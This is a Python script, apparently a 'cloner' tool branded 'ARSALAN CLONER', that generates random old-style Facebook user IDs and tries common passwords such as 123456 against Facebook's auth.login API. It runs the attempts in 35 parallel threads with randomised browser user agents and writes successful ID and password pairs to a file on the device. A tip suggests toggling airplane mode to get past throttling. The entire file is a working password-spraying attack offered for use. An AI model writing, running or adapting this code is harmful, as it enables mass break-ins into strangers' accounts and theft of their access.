import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor as PoolExecutor

# --- ARSALAN FRESH OLD CLONER ---
GR = '\x1b[38;5;46m'
RD = '\x1b[38;5;196m'
YL = '\x1b[38;5;220m'
WT = '\x1b[1;37m'
CY = '\x1b[38;5;51m'

ok_count = 0
cp_count = 0
total_loop = 0

def clear_term():
    os.system('clear')

def show_banner():
    clear_term()
    print(f"""{GR}
==========================================        
OWNER : ARSALAN CLONER 804
TOOL  : ZERO-COPY OLD ID GENERATOR (v3.0)
=========================================={WT}""")

def get_user_agent():
    browser_ver = random.randint(120, 143)
    build_no = random.randint(6000, 7300)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_ver}.0.{build_no}.0 Safari/537.36"

def main_menu():
    show_banner()
    print(f"       {CY}(1){WT} {GR}START OLD ID CLONING (RANDOM SERIES){WT}")
    print(f"{GR}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{WT}")
    user_choice = input(f"       CHOOSE : {YL}")
    if user_choice in ['1', 'A', 'a']:
        execute_cloning()
    else:
        print(f"       {RD}Invalid Choice!{WT}")
        time.sleep(2)
        main_menu()

def execute_cloning():
    show_banner()
    print(f"       {GR}ENTER TARGET ID LIMIT (e.g. 10000, 25000){WT}")
    print(f"{GR}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{WT}")
    limit_input = input(f"       LIMIT : {YL}")
    
    try:
        max_limit = int(limit_input)
    except:
        max_limit = 5000

    id_pool = []
    for _ in range(max_limit):
        # Old ID structural prefix format
        generated_id = '10000' + str(random.choice(range(100000000, 999999999)))
        id_pool.append(generated_id)

    show_banner()
    print(f"       {GR}TOTAL PROCESSED IDS : {WT}{max_limit}")
    print(f"       {YL}TIP: USE AIRPLANE MODE IF SPEED SLOWS DOWN{WT}")
    print(f"{GR}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{WT}")

    with PoolExecutor(max_workers=35) as executor:
        for single_id in id_pool:
            executor.submit(crack_process, single_id)

def crack_process(uid):
    global total_loop, ok_count, cp_count
    try:
        pass_variations = ['123456', '1234567', '12345678', '123456789', '11223344']
        for current_pass in pass_variations:
            payload_data = {
                'format': 'json',
                'email': str(uid),
                'password': str(current_pass),
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'method': 'auth.login'
            }
            req_headers = {'User-Agent': get_user_agent()}
            resp = requests.post('https://b-api.facebook.com/method/auth.login', data=payload_data, headers=req_headers, timeout=10).json()
            
            if 'access_token' in resp:
                print(f"\r\r{GR}[ARSALAN-OK] {uid} | {current_pass}{WT}")
                open('/sdcard/ARSALAN-NEW-OK.txt', 'a').write(f"{uid}|{current_pass}\n")
                ok_count += 1
                break
            elif 'www.facebook.com' in str(resp):
                print(f"\r\r{YL}[ARSALAN-CP] {uid} | {current_pass}{WT}")
                cp_count += 1
                break
        
        total_loop += 1
        sys.stdout.write(f"\r\r{WT}[ARSALAN-ST][{total_loop}][OK-{ok_count}]{WT}")
        sys.stdout.flush()
    except:
        pass

if __name__ == '__main__':
    main_menu()
